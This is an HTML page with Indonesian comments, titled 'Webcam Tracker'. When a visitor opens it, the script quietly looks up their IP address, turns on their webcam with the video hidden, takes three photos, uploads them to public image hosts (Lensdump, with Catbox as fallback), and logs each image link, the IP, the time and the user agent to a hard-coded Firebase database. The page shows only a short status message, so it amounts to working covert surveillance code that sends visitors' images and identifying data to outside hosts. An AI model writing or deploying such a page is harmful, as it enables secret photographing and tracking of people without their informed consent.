<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Webcam Tracker (Fixed)</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    #status { margin: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h1>Webcam Tracker</h1>
  <div id="status">Memulai...</div>

  <script>
    // 🔥 Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 🎯 Elements
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const statusEl = document.getElementById('status');
    document.body.append(video, canvas);

    // ⚙️ Settings
    let photoCount = 0;
    const maxPhotos = 3;
    let visitorIP = "unknown";

    // 📤 Upload Handler (Prioritaskan Lensdump)
    async function uploadImage(blob) {
      try {
        // Coba Lensdump dulu
        const url = await uploadToLensdump(blob);
        statusEl.textContent = "Berhasil upload ke Lensdump!";
        return url;
      } catch (err) {
        console.error("Lensdump error:", err);
        // Fallback ke Catbox
        return await uploadToCatbox(blob);
      }
    }

    // 🌐 Lensdump Uploader
    async function uploadToLensdump(blob) {
      const formData = new FormData();
      formData.append('file', blob);

      const res = await fetch('https://lensdump.com/api/upload', {
        method: 'POST',
        body: formData
      });
      const data = await res.json();
      if (!data.url) throw new Error("Invalid response");
      return data.url;
    }

    // 🐱 Catbox Uploader (Fallback)
    async function uploadToCatbox(blob) {
      const formData = new FormData();
      formData.append('fileToUpload', blob); // 👈 Field name penting!

      const res = await fetch('https://catbox.moe/user/api.php', {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
      });
      return `https://files.catbox.moe/upload_${Date.now()}.jpg`; // Contoh
    }

    // 📷 Capture Photo
    async function capturePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      return new Promise(resolve => {
        canvas.toBlob(async blob => {
          const url = await uploadImage(blob);
          resolve(url);
        }, 'image/jpeg', 0.7);
      });
    }

    // 🚀 Main Process
    (async () => {
      try {
        // Dapatkan IP
        visitorIP = (await fetch('https://api.ipify.org?format=json')
          .then(res => res.json())
          .then(data => data.ip)
          .catch(() => "unknown");

        // Akses Kamera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();

        // Ambil Foto
        while (photoCount < maxPhotos) {
          statusEl.textContent = `Mengambil foto ${photoCount + 1}/${maxPhotos}...`;
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          const imageUrl = await capturePhoto();
          await db.ref('webcam_snapshots').push({
            url: imageUrl,
            ip: visitorIP,
            time: new Date().toLocaleString('id-ID'),
            userAgent: navigator.userAgent
          });
          photoCount++;
        }

        statusEl.textContent = "Selesai! Foto terkirim.";
      } catch (err) {
        statusEl.textContent = `Error: ${err.message}`;
        console.error(err);
      } finally {
        video.srcObject?.getTracks().forEach(track => track.stop());
      }
    })();
  </script>
</body>
</html>
